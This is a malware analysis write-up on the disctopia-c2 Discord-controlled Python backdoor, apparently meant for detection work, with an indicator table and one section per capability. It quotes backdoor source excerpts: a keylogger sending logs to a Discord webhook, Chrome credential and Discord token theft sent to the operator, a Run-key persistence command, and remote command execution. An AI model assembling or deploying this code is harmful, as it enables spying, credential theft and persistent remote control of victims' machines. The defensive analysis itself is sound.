# disctopia-c2

## Table of Contents

- [disctopia-c2](#disctopia-c2)
  - [Table of Contents](#table-of-contents)
  - [Metadata](#metadata)
  - [Description](#description)
  - [Documentation](#documentation)
  - [Indicators](#indicators)
  - [Capabilities](#capabilities)
    - [List Processes](#list-processes)
    - [Download Files](#download-files)
    - [Upload Files](#upload-files)
    - [Extract Discord Tokens](#extract-discord-tokens)
    - [Take Screenshots](#take-screenshots)
    - [Keylogger](#keylogger)
    - [Steal Browser Credential](#steal-browser-credential)
    - [Persistence](#persistence)
    - [CMD](#cmd)
  - [Functionalities](#functionalities)
    - [isVM](#isvm)
    - [isAdmin](#isadmin)
    - [keylogs](#keylogs)
    - [getIP](#getip)
    - [getBits](#getbits)
    - [getUsername](#getusername)
    - [getOS](#getos)
    - [getCPU](#getcpu)
    - [getHostname](#gethostname)
    - [createConfig](#createconfig)
    - [createUploads](#createuploads)
    - [create ID File](#create-id-file)

## Metadata

- Evaluator(s): [Nasreddine Bencherchali (@nas_bench)](https://twitter.com/nas_bench)
- Date: 22/01/2022
- Modified: 22/01/2022
- Source: [disctopia-c2 v1.0.1](https://github.com/3ct0s/disctopia-c2/releases/tag/v1.0.1)
- Implementation: Python 3.8.9

## Description

> Disctopia is an open source Python Discord Bot that works as a backdoor that you can control from a Discord server. It uses the Discord API to communicate between the agent and the Discord server - [Disctopia README](https://github.com/3ct0s/disctopia-c2#what-is-disctopia)

## Documentation

- [Disctopia Help Command](https://github.com/3ct0s/disctopia-c2/blob/c0281b88b330fd63af51096a2e71e94272dde345/inst/COMMANDS.md)

## Indicators

| Description        | Indicator                                                                                                          | Reference                          |
|--------------------|--------------------------------------------------------------------------------------------------------------------|------------------------------------|
| Process Creation   | ```tasklist``` | [List Processes](#list-processes) |
| Process Creation   | ```reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "%appdata%\Windows-Explorer.exe"``` | [Persistence](#persistence) |
| Process Creation   | ```attrib +h``` | [createConfig](#createconfig) |
| HTTP Request       | ```https://api.ipify.org``` | [Extract Discord Tokens](#extract-discord-tokens)<br />[getIP](#getip) |
| User-Agent         | ```python-requests/(Version)``` | [Upload Files](#upload-files)  |
| User-Agent         | ```Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11``` | [Extract Discord Tokens](#extract-discord-tokens) |
| User-Agent         | ```DiscordBot (https://github.com/Rapptz/discord.py {0}) Python/{1[0]}.{1[1]} aiohttp/{2}``` | [Download Files](#download-files) |
| Directory Creation | ```%userprofile%\.config``` | [Create Config](#createconfig) |
| Directory Creation | ```%userprofile%\.config\uploads``` | [Create Uploads](#createuploads) |
| File Creation      | ```%userprofile%\.config\uploads\ID``` | [Create ID File](#create-id-file) |
| File Creation      | ```%appdata%\.cache~$``` | [Extract Discord Tokens](#extract-discord-tokens) |
| File Creation      | ```%temp%\s.png``` | [Take Screenshots](#take-screenshots) |
| File Creation      | ```%temp%\report.txt``` | [Keylogger](#keylogger)<br />[Keylogs](#keylogs) |
| File Creation      | ```my_chrome_data.db``` | [Steal Browser Credential](#steal-browser-credential) |
| File Creation      | ```%temp%\data.json``` | [Steal Browser Credential](#steal-browser-credential) |
| File Creation      | ```%appdata%\Windows-Explorer.exe``` | [Persistence](#persistence) |
| File Creation      | ```%temp%\response.txt``` | [List Processes](#list-processes)<br />[CMD](#cmd) |
| Registry Creation  | ```HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update``` | [Persistence](#persistence) |

## Capabilities

### List Processes

- Description: List the running processes on a system
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L156
- Indicators:
  - Call `tasklist` binary with the `CREATE_NO_WINDOW` flag (0x08000000)

    ```python
    @client.command(name='process',pass_context=True)
    async def process(context):
        command = context.message.content.replace("!process ", "")
        result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
        .....
    ```

  - If the length of the results is bigger than 4000 then its written to the following location: `%temp%\response.txt`

    ```python
    .....
    if int(word_list[0]) == int(ID):
        if len(out) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(out)
            await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
            await context.message.channel.send(file=discord.File(path))
            os.remove(path)
            .....
    ```

### Download Files

- Description: Download files from the agent
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L173
- Indicators:
  - Communication via the discord API using (discord.py) uses the following hardocded user-agent

  ```python
  user_agent = 'DiscordBot (https://github.com/Rapptz/discord.py {0}) Python/{1[0]}.{1[1]} aiohttp/{2}'
  self.user_agent = user_agent.format(__version__, sys.version_info, aiohttp.__version__)
  ```

### Upload Files

- Description: Upload files to agent
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L173
- Indicators:
  - Uplaoded files are stored in the `uploads` directory
  - Files are requested using the requests library which contain the hardcoded user-agent `python-requests/(Version)`

  ```python
  try:
      r = requests.get(url, allow_redirects=True, verify=False)
      open(fr"{path}\{name}", 'wb').write(r.content)
      my_embed = discord.Embed(title=f"{name} has been uploaded to Agent#{ID}", color=0x00FF00)
      await context.message.channel.send(embed=my_embed)
  except Exception as e:
      my_embed = discord.Embed(title=f"Error while uploading {name} to Agent#{ID}:\n{e}", color=0xFF0000)
      await context.message.channel.send(embed=my_embed)  
  ```

### Extract Discord Tokens

- Description: Get the stored Discord Tokens from the agent
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L210
- Indicators:
  - Make requests to discord URL's using the following user-agent: `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11`
  
  ```python
  def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
  ```

  - Make request to `https://api.ipify.org` to get the current IP

  ```python
  def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
  ```

  - Write file to the following location `%appdata%\.cache~$`

  ```python
  cache_path = ROAMING + "\\.cache~$"
  .....
  with open(cache_path, "a") as file:
    for token in checked:
        if not token in already_cached_tokens:
            file.write(token + "\n")
  .....
  ```

  - Read `.ldb` and `.log` files from the following locations

  ```python
  "%appdata%\\Discord",
  "%appdata%\\discordcanary",
  "%appdata%\\discordptb",
  "%localappdata%\\Google\\Chrome\\User Data\\Default",
  "%appdata%\\Opera Software\\Opera Stable",
  "%localappdata%\\BraveSoftware\\Brave-Browser\\User Data\\Default",
  "%localappdata%\\Yandex\\YandexBrowser\\User Data\\Default"
  ```

### Take Screenshots

- Description: Take a screenshot of the agents screen
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L221
- Indicators:
  - Save the screenshot to the following location: `%temp%\s.png`

  ```python
  .....
  try:
    Screenshot = pyautogui.screenshot()
    path = os.environ["temp"] +"\\s.png"
    Screenshot.save(path)
    now = datetime.now()
    await channel.send(f"**Agent #{ID}*- | Screenshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
    os.remove(path)
    my_embed = discord.Embed(title=f"Got screenshot from Agent#{ID}", color=0x00FF00)
  .....
  ```

### Keylogger

- Description: Log keystrokes
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L242
- Indicators:
  - Write files to the following location: `%temp%\report.txt`

  ```python
  def report_to_webhook(self):
    flag = False
    webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
    if len(self.log) > 2000:
        flag = True
        path = os.environ["temp"] + "\\report.txt"
        with open(path, 'w+') as file:
            file.write(f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}\n\n")
            file.write(self.log)
        with open(path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='report.txt')
    else:
        embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
        webhook.add_embed(embed)    
    webhook.execute()
    if flag:
        os.remove(path)
  ```

### Steal Browser Credential

- Description: Get the stored chrome credentials from the agent.
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L264
- Indicators:
  - Copy the goolge chrome database and create the following file: `my_chrome_data.db`

  ```python
  def stealcreds():
    password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(password_db_path,"my_chrome_data.db")
    .....
  ```

  - Save the collected credentials in the following file: `%temp%\data.json`

  ```python
  ......
  try:
    data = credentials.stealcreds()
    path = os.environ["temp"] +"\\data.json"
    with open(path, 'w+') as outfile:
        json.dump(data, outfile, indent=4)
    await channel.send(f"Agent #{ID} Chrome Credentials:")
    await channel.send(file=discord.File(path))
    ......
  ```

### Persistence

- Description: Enable persistence on the target agent
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L286
- Indicators:
  - The agent will copy itself to the following location: `%appdata%\Windows-Explorer.exe`
  
  ```python
  .....
  try:
    backdoor_location = os.environ["appdata"] + "\\Windows-Explorer.exe"
    if not os.path.exists(backdoor_location):
        shutil.copyfile(sys.executable, backdoor_location)
  .....
  ```

  - Execute the `reg` command to add a new registry key

  ```python
  sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '"', shell=True)
  ```

### CMD

- Description: Execute any command on the host via the agent
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L302
- Indicators:
  - Write the results of the command if they exceed a length of `4000` to the following location: `%temp%\response.txt`

  ```python
  .....
  if len(out) > 4000:
    path = os.environ["temp"] +"\\response.txt"     
    with open(path, 'w') as file:
        file.write(out)
    await context.message.channel.send(f"**Message was too large, sending a file with the response instead**")
    await context.message.channel.send(file=discord.File(path))
    os.remove(path)
  .....
  ```

## Functionalities

### isVM

- Description: Determine if Python is running inside virtualenv
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L33
- Indicators: N/A

### isAdmin

- Description: Determine if its running with admin privileges
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L42
- Indicators:
  - Uses "shell32.dll" function "IsUserAnAdmin" [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-isuseranadmin)

    ```python
    def isAdmin():
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin
    ```

### keylogs

- Description: Keylogger function based on the "keyboard" [package](https://pypi.org/project/keyboard/)
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L49
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/libraries/keylogger.py#L7
- Indicators:
  - Creation of a file `report.txt` in the `temp` directory

    ```python
    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=self.webhook, username="Keylogger")
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report | Agent#{self.id} | Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if flag:
            os.remove(path)
    ```

### getIP

- Description: Collect IP of the host
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L56
- Indicators:
  - HTTP call to `https://api.ipify.org`

### getBits

- Description: Get the bitness of the host
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L63
- Indicators: N/A

### getUsername

- Description: Get the username of the host
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L70
- Indicators: N/A

### getOS

- Description: Get the OS
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L77
- Indicators: N/A

### getCPU

- Description: Get the processor
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L84
- Indicators: N/A

### getHostname

- Description: Get the hostname
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L91
- Indicators: N/A

### createConfig

- Description: Create configuration directory on the host
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L98
- Indicators:
  - Creation of `.config` directory inside the `%userprofile%` directory
  - Execution of `attrib` command to hide the file

    ```python
    def createConfig():
        try:
            path = fr'"C:\Users\{USERNAME}\.config"'
            new_path = path[1:]
            new_path = new_path[:-1]
            os.mkdir(new_path)     
            os.system(f"attrib +h {path}")
            .....
    ```

### createUploads

- Description: Create uploads directory
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L110
- Indicators:
  - Creation of the `uploads` directory inside the `%userprofile%\.config` directory

    ```python
    def createUploads():
        try:
            path = fr'C:\Users\{USERNAME}\.config\uploads'
            os.mkdir(path)
        except WindowsError as e:
            if e.winerror == 183:
                pass
    ```

### create ID File

- Description: Create ID file that contains the agent ID
- Source Reference:
  - https://github.com/3ct0s/disctopia-c2/blob/3d16886e2d852ac06081453ed57f2750a74a6166/code/main.py#L129
- Indicators:
  - Creation of the `ID` file inside the `%userprofile%\.config` directory
